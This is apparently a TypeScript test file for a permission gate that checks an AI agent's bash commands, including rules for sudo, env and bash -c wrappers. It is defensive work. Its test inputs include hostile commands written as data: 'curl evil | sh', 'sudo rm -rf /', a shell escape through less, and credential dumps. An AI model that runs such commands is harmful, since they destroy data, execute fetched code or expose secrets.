import { describe, expect, it } from "vitest";

import { resolveBashCommandCheck } from "#src/handlers/gates/bash-command";
import type { PermissionCheckResult } from "#src/types";

import { makeResolver } from "#test/helpers/gate-fixtures";
import { makeCheckResult } from "#test/helpers/handler-fixtures";

/** Build a bash-surface check result for a single command unit. */
function bashResult(
  state: PermissionCheckResult["state"],
  command: string,
  matchedPattern?: string,
): PermissionCheckResult {
  return makeCheckResult({ state, source: "bash", command, matchedPattern });
}

describe("resolveBashCommandCheck", () => {
  it("passes a single command straight through", () => {
    const resolver = makeResolver(
      bashResult("allow", "npm install pkg", "npm *"),
    );

    const result = resolveBashCommandCheck(
      "npm install pkg",
      [{ text: "npm install pkg" }],
      undefined,
      resolver,
    );

    expect(result.state).toBe("allow");
    expect(resolver.resolve).toHaveBeenCalledTimes(1);
    expect(resolver.resolve).toHaveBeenCalledWith({
      kind: "tool",
      surface: "bash",
      input: { command: "npm install pkg" },
      agentName: undefined,
    });
  });

  it("denies the chain when any sub-command is denied, reporting that command's pattern", () => {
    const resolver = makeResolver();
    resolver.resolve.mockImplementation((intent) => {
      const command = (intent as { input: { command: string } }).input.command;
      return command.startsWith("npm")
        ? bashResult("deny", command, "npm *")
        : bashResult("allow", command, "cd *");
    });

    const result = resolveBashCommandCheck(
      "cd /p && npm install pkg",
      [{ text: "cd /p" }, { text: "npm install pkg" }],
      undefined,
      resolver,
    );

    expect(result.state).toBe("deny");
    expect(result.matchedPattern).toBe("npm *");
    expect(result.command).toBe("npm install pkg");
  });

  it("asks when a sub-command asks and none denies", () => {
    const resolver = makeResolver();
    resolver.resolve.mockImplementation((intent) => {
      const command = (intent as { input: { command: string } }).input.command;
      return command.startsWith("git")
        ? bashResult("ask", command, "git *")
        : bashResult("allow", command, "cd *");
    });

    const result = resolveBashCommandCheck(
      "cd /p && git push",
      [{ text: "cd /p" }, { text: "git push" }],
      undefined,
      resolver,
    );

    expect(result.state).toBe("ask");
    expect(result.matchedPattern).toBe("git *");
    expect(result.command).toBe("git push");
  });

  it("returns the first allow result when every sub-command is allowed", () => {
    const resolver = makeResolver();
    resolver.resolve.mockImplementation((intent) => {
      const command = (intent as { input: { command: string } }).input.command;
      return bashResult("allow", command, `${command} *`);
    });

    const result = resolveBashCommandCheck(
      "a && b",
      [{ text: "a" }, { text: "b" }],
      undefined,
      resolver,
    );

    expect(result.state).toBe("allow");
    expect(result.matchedPattern).toBe("a *");
  });

  it("falls back to the whole command for a comment-only line (genuinely nothing to gate)", () => {
    const resolver = makeResolver(bashResult("allow", "# just a comment", "*"));

    const result = resolveBashCommandCheck(
      "# just a comment",
      [],
      undefined,
      resolver,
    );

    expect(result.state).toBe("allow");
    expect(resolver.resolve).toHaveBeenCalledTimes(1);
    expect(resolver.resolve).toHaveBeenCalledWith({
      kind: "tool",
      surface: "bash",
      input: { command: "# just a comment" },
      agentName: undefined,
    });
  });

  it("falls back to the whole command for an empty/whitespace-only command", () => {
    const resolver = makeResolver(bashResult("allow", "   ", "*"));

    const result = resolveBashCommandCheck("   ", [], undefined, resolver);

    expect(result.state).toBe("allow");
    expect(resolver.resolve).toHaveBeenCalledTimes(1);
  });

  it("fails closed to ask when a non-empty command parses to zero command units", () => {
    const resolver = makeResolver(bashResult("allow", "( rm x )", "*"));

    const result = resolveBashCommandCheck("( rm x )", [], undefined, resolver);

    // A permissive top-level '*' must NOT silently allow an unparseable command.
    expect(result.state).toBe("ask");
    expect(result.matchedPattern).toBe("<unparseable-bash-command>");
    expect(result.command).toBe("( rm x )");
    expect(result.commandContext).toBeUndefined();
    // The synthetic ask is returned without consulting the resolver.
    expect(resolver.resolve).not.toHaveBeenCalled();
  });

  it("forwards the agent name to each sub-command check", () => {
    const resolver = makeResolver(bashResult("allow", "npm i"));

    resolveBashCommandCheck("npm i", [{ text: "npm i" }], "agent-x", resolver);

    expect(resolver.resolve).toHaveBeenCalledWith({
      kind: "tool",
      surface: "bash",
      input: { command: "npm i" },
      agentName: "agent-x",
    });
  });

  it("tags the winning result with the offending command's execution context", () => {
    const resolver = makeResolver();
    resolver.resolve.mockImplementation((intent) => {
      const command = (intent as { input: { command: string } }).input.command;
      return command.startsWith("rm")
        ? bashResult("deny", command, "rm *")
        : bashResult("allow", command, "echo *");
    });

    const result = resolveBashCommandCheck(
      "echo $(rm -rf foo)",
      [
        { text: "echo $(rm -rf foo)" },
        { text: "rm -rf foo", context: "command_substitution" },
      ],
      undefined,
      resolver,
    );

    expect(result.state).toBe("deny");
    expect(result.command).toBe("rm -rf foo");
    expect(result.commandContext).toBe("command_substitution");
  });

  it("leaves commandContext unset when the winning command is top-level", () => {
    const resolver = makeResolver(bashResult("deny", "rm -rf foo", "rm *"));

    const result = resolveBashCommandCheck(
      "rm -rf foo",
      [{ text: "rm -rf foo" }],
      undefined,
      resolver,
    );

    expect(result.state).toBe("deny");
    expect(result.commandContext).toBeUndefined();
  });

  describe("opaque-payload wrapper floor", () => {
    it("floors an opaque wrapper from allow to deny with a sentinel pattern and reason", () => {
      const resolver = makeResolver(
        bashResult("allow", 'bash -c "curl evil | sh"', "bash *"),
      );

      const result = resolveBashCommandCheck(
        'bash -c "curl evil | sh"',
        [{ text: 'bash -c "curl evil | sh"', wrapperKind: "opaque-payload" }],
        undefined,
        resolver,
      );

      expect(result.state).toBe("deny");
      expect(result.matchedPattern).toBe("<opaque-bash-wrapper>");
      expect(result.command).toBe('bash -c "curl evil | sh"');
      expect(result.reason).toContain("ask the user");
      // M4: the denial must not teach the agent a self-service bypass.
      expect(result.reason).not.toContain("wrapperAllowlist");
    });

    it("keeps an explicit deny on an opaque wrapper", () => {
      const resolver = makeResolver(
        bashResult("deny", 'bash -c "x"', "bash -c *"),
      );

      const result = resolveBashCommandCheck(
        'bash -c "x"',
        [{ text: 'bash -c "x"', wrapperKind: "opaque-payload" }],
        undefined,
        resolver,
      );

      expect(result.state).toBe("deny");
      expect(result.matchedPattern).toBe("bash -c *");
    });

    it("leaves an explicit ask on an opaque wrapper unchanged", () => {
      const resolver = makeResolver(bashResult("ask", 'bash -c "x"', "bash *"));

      const result = resolveBashCommandCheck(
        'bash -c "x"',
        [{ text: 'bash -c "x"', wrapperKind: "opaque-payload" }],
        undefined,
        resolver,
      );

      expect(result.state).toBe("ask");
      expect(result.matchedPattern).toBe("bash *");
    });

    it("does not floor a non-opaque allow", () => {
      const resolver = makeResolver(bashResult("allow", "ls", "ls *"));

      const result = resolveBashCommandCheck(
        "ls",
        [{ text: "ls" }],
        undefined,
        resolver,
      );

      expect(result.state).toBe("allow");
      expect(result.matchedPattern).toBe("ls *");
    });
  });

  describe("indirection wrapper floor", () => {
    it("floors an indirection wrapper from allow to deny with a sentinel pattern and reason", () => {
      const resolver = makeResolver(
        bashResult("allow", "sudo aws s3 rm s3://bucket", "*"),
      );

      const result = resolveBashCommandCheck(
        "sudo aws s3 rm s3://bucket",
        [{ text: "sudo aws s3 rm s3://bucket", wrapperKind: "indirection" }],
        undefined,
        resolver,
      );

      expect(result.state).toBe("deny");
      expect(result.matchedPattern).toBe("<indirection-bash-wrapper>");
      expect(result.command).toBe("sudo aws s3 rm s3://bucket");
      expect(result.reason).toContain("ask the user");
      expect(result.reason).not.toContain("wrapperAllowlist");
    });

    it("keeps an explicit deny on an indirection wrapper", () => {
      const resolver = makeResolver(
        bashResult("deny", "sudo rm -rf /", "sudo *"),
      );

      const result = resolveBashCommandCheck(
        "sudo rm -rf /",
        [{ text: "sudo rm -rf /", wrapperKind: "indirection" }],
        undefined,
        resolver,
      );

      expect(result.state).toBe("deny");
      expect(result.matchedPattern).toBe("sudo *");
    });

    it("leaves an explicit ask on an indirection wrapper unchanged", () => {
      const resolver = makeResolver(bashResult("ask", "sudo aws", "sudo *"));

      const result = resolveBashCommandCheck(
        "sudo aws",
        [{ text: "sudo aws", wrapperKind: "indirection" }],
        undefined,
        resolver,
      );

      expect(result.state).toBe("ask");
      expect(result.matchedPattern).toBe("sudo *");
    });
  });

  describe("wrapperAllowlist", () => {
    it("keeps allow when the unit text starts with an allowlist entry", () => {
      const resolver = makeResolver(
        bashResult("allow", "env FOO=1 python script.py", "*"),
      );

      const result = resolveBashCommandCheck(
        "env FOO=1 python script.py",
        [{ text: "env FOO=1 python script.py", wrapperKind: "indirection" }],
        undefined,
        resolver,
        ["env FOO=1"],
      );

      expect(result.state).toBe("allow");
      expect(result.matchedPattern).toBe("*");
    });

    it("floors to deny when the unit matches no allowlist entry", () => {
      const resolver = makeResolver(
        bashResult("allow", "env BAR=2 python script.py", "*"),
      );

      const result = resolveBashCommandCheck(
        "env BAR=2 python script.py",
        [{ text: "env BAR=2 python script.py", wrapperKind: "indirection" }],
        undefined,
        resolver,
        ["env FOO=1"],
      );

      expect(result.state).toBe("deny");
      expect(result.matchedPattern).toBe("<indirection-bash-wrapper>");
    });

    it("floors to deny when no allowlist is passed (default empty)", () => {
      const resolver = makeResolver(
        bashResult("allow", "env BAR=2 python script.py", "*"),
      );

      const result = resolveBashCommandCheck(
        "env BAR=2 python script.py",
        [{ text: "env BAR=2 python script.py", wrapperKind: "indirection" }],
        undefined,
        resolver,
      );

      expect(result.state).toBe("deny");
      expect(result.matchedPattern).toBe("<indirection-bash-wrapper>");
    });

    it("allowlists an opaque payload too when explicitly trusted", () => {
      const resolver = makeResolver(
        bashResult("allow", 'bash -c "echo hi"', "bash *"),
      );

      const result = resolveBashCommandCheck(
        'bash -c "echo hi"',
        [{ text: 'bash -c "echo hi"', wrapperKind: "opaque-payload" }],
        undefined,
        resolver,
        ['bash -c "echo hi"'],
      );

      expect(result.state).toBe("allow");
      expect(result.matchedPattern).toBe("bash *");
    });

    it("keeps an explicit deny even when the unit is allowlisted", () => {
      const resolver = makeResolver(
        bashResult("deny", "sudo rm -rf /", "sudo *"),
      );

      const result = resolveBashCommandCheck(
        "sudo rm -rf /",
        [{ text: "sudo rm -rf /", wrapperKind: "indirection" }],
        undefined,
        resolver,
        ["sudo"],
      );

      expect(result.state).toBe("deny");
      expect(result.matchedPattern).toBe("sudo *");
    });
  });

  describe("read-only wrapper fast path", () => {
    it("auto-allows an indirection wrapper wrapping a read-only command", () => {
      const resolver = makeResolver(bashResult("allow", "xargs", "*"));
      const result = resolveBashCommandCheck(
        "xargs grep pattern",
        [{ text: "xargs grep pattern", wrapperKind: "indirection" }],
        undefined,
        resolver,
      );
      expect(result.state).toBe("allow");
      expect(result.matchedPattern).toBe("<readonly-chain>");
    });

    it("penetrates wrapper options/env-vars to the inner command", () => {
      const resolver = makeResolver(bashResult("allow", "env", "*"));
      const result = resolveBashCommandCheck(
        "env VAR=x grep pattern",
        [{ text: "env VAR=x grep pattern", wrapperKind: "indirection" }],
        undefined,
        resolver,
      );
      expect(result.state).toBe("allow");
      expect(result.matchedPattern).toBe("<readonly-chain>");
    });

    it("treats a bare non-dumping wrapper (no inner command) as read-only", () => {
      const resolver = makeResolver(bashResult("allow", "time", "*"));
      const result = resolveBashCommandCheck(
        "time",
        [{ text: "time", wrapperKind: "indirection" }],
        undefined,
        resolver,
      );
      expect(result.state).toBe("allow");
      expect(result.matchedPattern).toBe("<readonly-chain>");
    });

    it("does NOT treat a bare env as read-only — environment dump (M3)", () => {
      const resolver = makeResolver(bashResult("allow", "env", "*"));
      const result = resolveBashCommandCheck(
        "env",
        [{ text: "env", wrapperKind: "indirection" }],
        undefined,
        resolver,
      );
      expect(result.state).toBe("deny");
      expect(result.matchedPattern).toBe("<indirection-bash-wrapper>");
    });

    it("treats a piped bare env as read-only — output feeds the next stage (M3)", () => {
      const resolver = makeResolver(bashResult("allow", "env", "*"));
      const result = resolveBashCommandCheck(
        "env | grep FOO",
        [
          { text: "env", wrapperKind: "indirection", piped: true },
          { text: "grep FOO" },
        ],
        undefined,
        resolver,
      );
      expect(result.state).toBe("allow");
      expect(result.matchedPattern).toBe("<readonly-chain>");
    });

    it("does not short-circuit a wrapper wrapping a mutating command", () => {
      const resolver = makeResolver(bashResult("allow", "sudo", "*"));
      const result = resolveBashCommandCheck(
        "sudo rm file",
        [{ text: "sudo rm file", wrapperKind: "indirection" }],
        undefined,
        resolver,
      );
      expect(result.state).toBe("deny");
      expect(result.matchedPattern).toBe("<indirection-bash-wrapper>");
    });

    it("does not short-circuit an opaque payload", () => {
      const resolver = makeResolver(
        bashResult("allow", 'bash -c "cat x"', "*"),
      );
      const result = resolveBashCommandCheck(
        'bash -c "cat x"',
        [{ text: 'bash -c "cat x"', wrapperKind: "opaque-payload" }],
        undefined,
        resolver,
      );
      expect(result.state).toBe("deny");
    });

    it("does not treat a stderr merge (2>&1) as a write redirect", () => {
      const resolver = makeResolver(bashResult("allow", "env", "*"));
      const result = resolveBashCommandCheck(
        "env 2>&1 | grep FOO",
        [
          { text: "env", wrapperKind: "indirection", piped: true },
          { text: "grep FOO" },
        ],
        undefined,
        resolver,
      );
      expect(result.state).toBe("allow");
      expect(result.matchedPattern).toBe("<readonly-chain>");
    });
    it("does not short-circuit when a write redirect is present", () => {
      const resolver = makeResolver(bashResult("allow", "env", "*"));
      const result = resolveBashCommandCheck(
        "env > out.txt",
        [{ text: "env", wrapperKind: "indirection" }],
        undefined,
        resolver,
      );
      expect(result.state).toBe("deny");
    });

    it("allows gh auth status in a wrapper chain", () => {
      const resolver = makeResolver(bashResult("allow", "env", "*"));
      const result = resolveBashCommandCheck(
        "env | gh auth status",
        [
          { text: "env", wrapperKind: "indirection", piped: true },
          { text: "gh auth status" },
        ],
        undefined,
        resolver,
      );
      expect(result.state).toBe("allow");
      expect(result.matchedPattern).toBe("<readonly-chain>");
    });

    it("allows sed without -i in a wrapper chain", () => {
      const resolver = makeResolver(bashResult("allow", "env", "*"));
      const result = resolveBashCommandCheck(
        "env | sed 's/a/b/'",
        [
          { text: "env", wrapperKind: "indirection", piped: true },
          { text: "sed 's/a/b/'" },
        ],
        undefined,
        resolver,
      );
      expect(result.state).toBe("allow");
    });

    it("does not short-circuit sed -i (in-place write)", () => {
      const resolver = makeResolver(bashResult("allow", "sed", "*"));
      const result = resolveBashCommandCheck(
        "env | sed -i 's/a/b/'",
        [
          { text: "env", wrapperKind: "indirection", piped: true },
          { text: "sed -i 's/a/b/'" },
        ],
        undefined,
        resolver,
      );
      expect(result.state).toBe("deny");
    });

    it("allows git config --get in a wrapper chain", () => {
      const resolver = makeResolver(bashResult("allow", "env", "*"));
      const result = resolveBashCommandCheck(
        "env | git config --get credential.helper",
        [
          { text: "env", wrapperKind: "indirection", piped: true },
          { text: "git config --get credential.helper" },
        ],
        undefined,
        resolver,
      );
      expect(result.state).toBe("allow");
      expect(result.matchedPattern).toBe("<readonly-chain>");
    });

    it("does not short-circuit git config --set (write)", () => {
      const resolver = makeResolver(bashResult("allow", "git", "*"));
      const result = resolveBashCommandCheck(
        "env | git config --set user.name x",
        [
          { text: "env", wrapperKind: "indirection", piped: true },
          { text: "git config --set user.name x" },
        ],
        undefined,
        resolver,
      );
      expect(result.state).toBe("deny");
    });

    it("does not short-circuit sed --in-place (long-form in-place write)", () => {
      const resolver = makeResolver(bashResult("allow", "sed", "*"));
      const result = resolveBashCommandCheck(
        "env | sed --in-place 's/a/b/' file",
        [
          { text: "env", wrapperKind: "indirection", piped: true },
          { text: "sed --in-place 's/a/b/' file" },
        ],
        undefined,
        resolver,
      );
      expect(result.state).toBe("deny");
    });

    it("penetrates timeout duration to the inner command", () => {
      const resolver = makeResolver(bashResult("allow", "timeout", "*"));
      const result = resolveBashCommandCheck(
        "timeout 10s grep pattern",
        [{ text: "timeout 10s grep pattern", wrapperKind: "indirection" }],
        undefined,
        resolver,
      );
      expect(result.state).toBe("allow");
      expect(result.matchedPattern).toBe("<readonly-chain>");
    });

    it("does not short-circuit a non-wrapper chain (normal resolve)", () => {
      const resolver = makeResolver(bashResult("allow", "ls", "ls *"));
      const result = resolveBashCommandCheck(
        "ls -la",
        [{ text: "ls -la" }],
        undefined,
        resolver,
      );
      expect(result.state).toBe("allow");
      expect(result.matchedPattern).toBe("ls *");
    });
  });
  describe("review-fix regressions (C1-C4, M1-M3)", () => {
    it("C1: env X=1 find / -name x -delete is not fast-pathed — floored to deny", () => {
      const resolver = makeResolver(bashResult("allow", "env", "*"));
      const result = resolveBashCommandCheck(
        "env X=1 find / -name x -delete",
        [
          {
            text: "env X=1 find / -name x -delete",
            wrapperKind: "indirection",
          },
        ],
        undefined,
        resolver,
      );
      expect(result.state).toBe("deny");
      expect(result.matchedPattern).toBe("<indirection-bash-wrapper>");
    });

    it("C2: env X=1 command rm -rf / is not fast-pathed — floored to deny", () => {
      const resolver = makeResolver(bashResult("allow", "env", "*"));
      const result = resolveBashCommandCheck(
        "env X=1 command rm -rf /",
        [{ text: "env X=1 command rm -rf /", wrapperKind: "indirection" }],
        undefined,
        resolver,
      );
      expect(result.state).toBe("deny");
      expect(result.matchedPattern).toBe("<indirection-bash-wrapper>");
    });

    it("C2: exec-capable shell escapes (less) are not in the read-only set", () => {
      const resolver = makeResolver(bashResult("allow", "env", "*"));
      const result = resolveBashCommandCheck(
        "env X=1 less +!rm file",
        [{ text: "env X=1 less +!rm file", wrapperKind: "indirection" }],
        undefined,
        resolver,
      );
      expect(result.state).toBe("deny");
    });

    it("C3: a string-prefix allowlist entry cannot match across a token boundary", () => {
      const resolver = makeResolver(
        bashResult("allow", "env PYTHONPATH=/evil sudo rm -rf /", "*"),
      );
      const result = resolveBashCommandCheck(
        "env PYTHONPATH=/evil sudo rm -rf /",
        [
          {
            text: "env PYTHONPATH=/evil sudo rm -rf /",
            wrapperKind: "indirection",
          },
        ],
        undefined,
        resolver,
        ["env PYTHONPATH="],
      );
      expect(result.state).toBe("deny");
      expect(result.matchedPattern).toBe("<indirection-bash-wrapper>");
    });

    it("C3: an exact token-sequence entry still allowlists a matching unit", () => {
      const resolver = makeResolver(
        bashResult("allow", "env FOO=1 python3 script.py", "*"),
      );
      const result = resolveBashCommandCheck(
        "env FOO=1 python3 script.py",
        [
          {
            text: "env FOO=1 python3 script.py",
            wrapperKind: "indirection",
          },
        ],
        undefined,
        resolver,
        ["env FOO=1 python3"],
      );
      expect(result.state).toBe("allow");
      expect(result.matchedPattern).toBe("*");
    });

    it("C4: an explicit deny rule beats the read-only fast path", () => {
      const resolver = makeResolver();
      resolver.resolve.mockImplementation((intent) => {
        const command = (intent as { input: { command: string } }).input
          .command;
        return bashResult("deny", command, "env *");
      });
      const result = resolveBashCommandCheck(
        "env X=1 cat file",
        [{ text: "env X=1 cat file", wrapperKind: "indirection" }],
        undefined,
        resolver,
      );
      expect(result.state).toBe("deny");
      expect(result.matchedPattern).toBe("env *");
    });

    it("C4: an explicit ask rule also abandons the read-only fast path", () => {
      const resolver = makeResolver();
      resolver.resolve.mockImplementation((intent) => {
        const command = (intent as { input: { command: string } }).input
          .command;
        return bashResult("ask", command, "env *");
      });
      const result = resolveBashCommandCheck(
        "env X=1 cat file",
        [{ text: "env X=1 cat file", wrapperKind: "indirection" }],
        undefined,
        resolver,
      );
      expect(result.state).toBe("ask");
    });

    it("C4: the fast path still applies when only the universal default asks", () => {
      // Universal default (no matchedPattern) must not kill the fast path —
      // otherwise a default ask/deny policy would disable it entirely.
      const resolver = makeResolver(bashResult("ask", "env X=1 cat file"));
      const result = resolveBashCommandCheck(
        "env X=1 cat file",
        [{ text: "env X=1 cat file", wrapperKind: "indirection" }],
        undefined,
        resolver,
      );
      expect(result.state).toBe("allow");
      expect(result.matchedPattern).toBe("<readonly-chain>");
    });

    it("M1: time git branch -D x is not read-only — floored to deny", () => {
      const resolver = makeResolver(bashResult("allow", "time", "*"));
      const result = resolveBashCommandCheck(
        "time git branch -D x",
        [{ text: "time git branch -D x", wrapperKind: "indirection" }],
        undefined,
        resolver,
      );
      expect(result.state).toBe("deny");
    });

    it("M1: env git remote add origin url is not read-only — floored to deny", () => {
      const resolver = makeResolver(bashResult("allow", "env", "*"));
      const result = resolveBashCommandCheck(
        "env git remote add origin url",
        [{ text: "env git remote add origin url", wrapperKind: "indirection" }],
        undefined,
        resolver,
      );
      expect(result.state).toBe("deny");
    });

    it("M1: time gh auth token (credential dump) is not read-only — floored to deny", () => {
      const resolver = makeResolver(bashResult("allow", "time", "*"));
      const result = resolveBashCommandCheck(
        "time gh auth token",
        [{ text: "time gh auth token", wrapperKind: "indirection" }],
        undefined,
        resolver,
      );
      expect(result.state).toBe("deny");
    });

    it("M2: time yq -i in-place edit is not read-only — floored to deny", () => {
      const resolver = makeResolver(bashResult("allow", "time", "*"));
      const result = resolveBashCommandCheck(
        "time yq -i '.a=1' config.yaml",
        [
          {
            text: "time yq -i '.a=1' config.yaml",
            wrapperKind: "indirection",
          },
        ],
        undefined,
        resolver,
      );
      expect(result.state).toBe("deny");
    });

    it("M2: time yq '.a' (no -i) stays read-only", () => {
      const resolver = makeResolver(bashResult("allow", "time", "*"));
      const result = resolveBashCommandCheck(
        "time yq '.a' config.yaml",
        [{ text: "time yq '.a' config.yaml", wrapperKind: "indirection" }],
        undefined,
        resolver,
      );
      expect(result.state).toBe("allow");
      expect(result.matchedPattern).toBe("<readonly-chain>");
    });

    it("M3: env X=1 printenv is not read-only — floored to deny", () => {
      const resolver = makeResolver(bashResult("allow", "env", "*"));
      const result = resolveBashCommandCheck(
        "env X=1 printenv",
        [{ text: "env X=1 printenv", wrapperKind: "indirection" }],
        undefined,
        resolver,
      );
      expect(result.state).toBe("deny");
    });
  });
});
